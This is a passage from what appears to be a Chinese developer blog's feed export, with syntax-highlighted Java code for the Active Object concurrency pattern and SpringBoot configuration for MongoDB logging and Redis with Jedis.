        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">notifyAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token class-name">Object</span> <span class="token function">getResultValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>ready<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>result<span class="token punctuation">.</span><span class="token function">getResultValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">MethodRequest</span> <span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">Servant</span> servant<span class="token punctuation">;</span>

    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">FutureResult</span> futureResult<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">MethodRequest</span><span class="token punctuation">(</span><span class="token class-name">Servant</span> servant<span class="token punctuation">,</span> <span class="token class-name">FutureResult</span> futureResult<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>servant <span class="token operator">=</span> servant<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>futureResult <span class="token operator">=</span> futureResult<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 提交任务的抽象方法。具体执行内容由子类定义。
     * 执行者交给servant，执行结果包装到futureResult中
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">MakeStringRequest</span> <span class="token keyword">extends</span> <span class="token class-name">MethodRequest</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> count<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">char</span> fillChar<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">MakeStringRequest</span><span class="token punctuation">(</span><span class="token class-name">Servant</span> servant<span class="token punctuation">,</span> <span class="token class-name">FutureResult</span> futureResult<span class="token punctuation">,</span> <span class="token keyword">int</span> count<span class="token punctuation">,</span> <span class="token keyword">char</span> fillChar<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>servant<span class="token punctuation">,</span> futureResult<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>fillChar <span class="token operator">=</span> fillChar<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>count <span class="token operator">=</span> count<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 任务执行的主体
     */</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        futureResult<span class="token punctuation">.</span><span class="token function">setResult</span><span class="token punctuation">(</span>servant<span class="token punctuation">.</span><span class="token function">makeString</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span> fillChar<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">DisplayStringRequest</span> <span class="token keyword">extends</span> <span class="token class-name">MethodRequest</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> text<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">DisplayStringRequest</span><span class="token punctuation">(</span><span class="token class-name">Servant</span> servant<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">String</span> text<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>servant<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>text <span class="token operator">=</span> text<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 任务执行的主体
     */</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>servant<span class="token punctuation">.</span><span class="token function">displayString</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">ActiveObjectFactory</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">ActiveObject</span> <span class="token function">createActiveObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Servant</span> servant <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Servant</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ActivationQueue</span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActivationQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">SchedulerThread</span> schedulerThread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SchedulerThread</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ActiveObjectProxy</span> proxy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveObjectProxy</span><span class="token punctuation">(</span>schedulerThread<span class="token punctuation">,</span> servant<span class="token punctuation">)</span><span class="token punctuation">;</span>
        schedulerThread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> proxy<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>以上对外开放的类仅仅<code>ActiveObjectFactory</code>、<code>ActiveObject</code>、<code>Result</code></p>
<p>以下为测试代码</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>hots<span class="token punctuation">.</span>part2<span class="token punctuation">.</span>chapter18<span class="token punctuation">.</span>action<span class="token punctuation">.</span></span><span class="token class-name">ActiveObject</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DisplayClientThread</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">ActiveObject</span> activeObject<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">DisplayClientThread</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">ActiveObject</span> activeObject<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>activeObject <span class="token operator">=</span> activeObject<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token boolean">true</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">String</span> text <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"=&gt;"</span> <span class="token operator">+</span> i<span class="token punctuation">;</span>
                activeObject<span class="token punctuation">.</span><span class="token function">displayString</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>hots<span class="token punctuation">.</span>part2<span class="token punctuation">.</span>chapter18<span class="token punctuation">.</span>action<span class="token punctuation">.</span></span><span class="token class-name">ActiveObject</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>hots<span class="token punctuation">.</span>part2<span class="token punctuation">.</span>chapter18<span class="token punctuation">.</span>action<span class="token punctuation">.</span></span><span class="token class-name">Result</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MakerClientThread</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">ActiveObject</span> activeObject<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">char</span> fillChar<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">MakerClientThread</span><span class="token punctuation">(</span><span class="token class-name">ActiveObject</span> activeObject<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>activeObject <span class="token operator">=</span> activeObject<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>fillChar <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token boolean">true</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">Result</span> result <span class="token operator">=</span> activeObject<span class="token punctuation">.</span><span class="token function">makeString</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> fillChar<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">String</span> value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> result<span class="token punctuation">.</span><span class="token function">getResultValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": value="</span> <span class="token operator">+</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>hots<span class="token punctuation">.</span>part2<span class="token punctuation">.</span>chapter18<span class="token punctuation">.</span>action<span class="token punctuation">.</span></span><span class="token class-name">ActiveObject</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>hots<span class="token punctuation">.</span>part2<span class="token punctuation">.</span>chapter18<span class="token punctuation">.</span>action<span class="token punctuation">.</span></span><span class="token class-name">ActiveObjectFactory</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">ActiveObject</span> activeObject <span class="token operator">=</span> <span class="token class-name">ActiveObjectFactory</span><span class="token punctuation">.</span><span class="token function">createActiveObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 制造makeString的请求</span>
        <span class="token keyword">new</span> <span class="token class-name">MakerClientThread</span><span class="token punctuation">(</span>activeObject<span class="token punctuation">,</span> <span class="token string">"Alice"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 制造displayString的请求</span>
        <span class="token keyword">new</span> <span class="token class-name">MakerClientThread</span><span class="token punctuation">(</span>activeObject<span class="token punctuation">,</span> <span class="token string">"Bobby"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">new</span> <span class="token class-name">DisplayClientThread</span><span class="token punctuation">(</span><span class="token string">"Chris"</span><span class="token punctuation">,</span> activeObject<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Chapter19：Event Bus 中介者模式</h1>
<h1>Chapter20：Event Driven 事件驱动设计模式</h1>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot集成MongoDB</title>
    <url>/20221031/eb573b79.html</url>
    <content><![CDATA[<h1>Spring Boot集成Mongodb在控制台输出nosql的日志</h1>
<p>大家只需要在<code>application.properties</code>的配置文件下增加以下的配置就可以了</p>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token key attr-name">logging.level.org.springframework.data.mongodb.core</span> <span class="token punctuation">=</span> <span class="token value attr-value">DEBUG</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment">###############log4j 4 SQL Output start################# </span>
<span class="token key attr-name">log4j.logger.com.dayainfo.ssp</span><span class="token punctuation">=</span><span class="token value attr-value">DEBUG </span>
<span class="token key attr-name">log4j.logger.com.springframework</span><span class="token punctuation">=</span><span class="token value attr-value">DEBUG </span>
<span class="token key attr-name">log4j.logger.com.ibatis</span><span class="token punctuation">=</span><span class="token value attr-value">DEBUG </span>
<span class="token key attr-name">log4j.logger.com.ibatis.common.jdbc.SimpleDataSource</span><span class="token punctuation">=</span><span class="token value attr-value">DEBUG </span>
<span class="token key attr-name">log4j.logger.com.ibatis.common.jdbc.ScriptRunner</span><span class="token punctuation">=</span><span class="token value attr-value">DEBUG </span>
<span class="token key attr-name">log4j.logger.com.ibatis.sqlmap.engine.impl.SqlMapClientDelegate</span><span class="token punctuation">=</span><span class="token value attr-value">DEBUG </span>
<span class="token key attr-name">log4j.logger.java.sql.Connection</span><span class="token punctuation">=</span><span class="token value attr-value">DEBUG </span>
<span class="token key attr-name">log4j.logger.java.sql.Statement</span><span class="token punctuation">=</span><span class="token value attr-value">DEBUG </span>
<span class="token key attr-name">log4j.logger.java.sql.PreparedStatement</span><span class="token punctuation">=</span><span class="token value attr-value">DEBUG </span>
<span class="token key attr-name">log4j.logger.java.sql.ResultSet</span><span class="token punctuation">=</span><span class="token value attr-value">DEBUG </span>
<span class="token key attr-name">log4j.logger.org.apache.ibatis.logging.commons.JakartaCommonsLoggingImpl</span><span class="token punctuation">=</span><span class="token value attr-value">DEBUG </span>
<span class="token key attr-name">log4j.logger.java.sql</span><span class="token punctuation">=</span><span class="token value attr-value">DEBUG,CONSOLE </span>
<span class="token key attr-name">log4j.appender.CONSOLE</span> <span class="token punctuation">=</span> <span class="token value attr-value">org.apache.</span>
<span class="token key attr-name">log4j.ConsoleAppender</span> 
<span class="token key attr-name">log4j.appender.CONSOLE.Target</span> <span class="token punctuation">=</span> <span class="token value attr-value">System.out </span>
<span class="token key attr-name">log4j.appender.CONSOLE.layout</span> <span class="token punctuation">=</span> <span class="token value attr-value">org.apache.</span>
<span class="token key attr-name">log4j.PatternLayout</span> 
<span class="token key attr-name">log4j.appender.CONSOLE.layout.ConversionPattern</span> <span class="token punctuation">=</span><span class="token value attr-value">%d{ABSOLUTE} %5p %c{1}\:%L - %m%n </span>
<span class="token comment">###############log4j 4 SQL Output end###################</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
        <tag>Mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot集成Redis</title>
    <url>/20230302/f677ab49.html</url>
    <content><![CDATA[<blockquote>
<p>Spring 通过模板方式（RedisTemplate）提供了对Redis的数据查询和操作功能。</p>
<p>可以参考 <a href="https://repo1.maven.org/maven2/org/springframework/boot/spring-boot-dependencies/2.6.6/spring-boot-dependencies-2.6.6.pom">https://repo1.maven.org/maven2/org/springframework/boot/spring-boot-dependencies/2.6.6/spring-boot-dependencies-2.6.6.pom</a> 查看版本依赖</p>
</blockquote>
<h1>基于RedisTemplate+Jedis的数据操作</h1>
<blockquote>
<p>Jedis是Redis的Java客户端，在SpringBoot 1.x版本中也是默认的客户端。在SpringBoot 2.x版本中默认客户端是Luttuce。</p>
</blockquote>
<h2 id="实现DEMO">实现DEMO</h2>
<ol>
<li>
<p>POM.xml</p>
<p>引入spring-boot-starter-data-redis包，SpringBoot2中默认的客户端是Lettuce, 所以需要exclude掉lettuce-core包，并引入jedis的包。</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.6.6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba.cloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-cloud-starter-alibaba-nacos-config<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-data-redis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.6.6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusions</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>io.lettuce<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>lettuce-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusions</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>redis.clients<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>jedis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.7.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.commons<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-pool2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.11.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>redis.yml 配置</p>
 <pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span> 
  <span class="token key atrule">redis</span><span class="token punctuation">:</span>
    <span class="token key atrule">database</span><span class="token punctuation">:</span> <span class="token number">0</span>
